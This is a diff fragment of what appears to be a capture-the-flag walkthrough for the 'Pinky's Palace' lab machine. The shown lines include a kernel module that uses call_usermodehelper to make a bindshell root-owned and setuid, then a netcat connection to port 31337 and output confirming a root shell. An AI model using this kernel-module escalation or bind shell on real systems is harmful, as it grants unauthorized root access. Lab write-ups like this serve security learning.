@@ -2641,20 +2520,20 @@ int init_module(void)
                                 "chown -R root:root /tmp/bind && chmod u+s /tmp/bind/bindshell",
                                 NULL
                         };
-​
+
         printk(KERN_INFO "[+] Command Execution Begin\n");
         call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
         printk(KERN_INFO "[+] Command Execution End\n");
         return 0;
-​
+
 }
-​
+
 void cleanup_module(void)
 {
   printk(KERN_INFO "Bye Those Guys!\n");
 } 
 ```
-​
+
 `make` and load the new kernel module then re-check the bindshell file permissions:
 
 ```
@@ -2679,7 +2558,7 @@ It worked! Now we can simply run the bind shell and connect as the root user:
 pinky@pinkys-palace:/tmp/rootkit$ /tmp/bind/bindshell
 Shellcode Length: 108
 
-​
+
 ATTACKER MACHINE
 nc 192.168.1.148 31337
 whoami
@@ -2687,7 +2566,6 @@ root
 id
 uid=1000(pinky) gid=1000(pinky) euid=0(root) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
 ```
-​
 
 And we finally have the root flag:
 ```
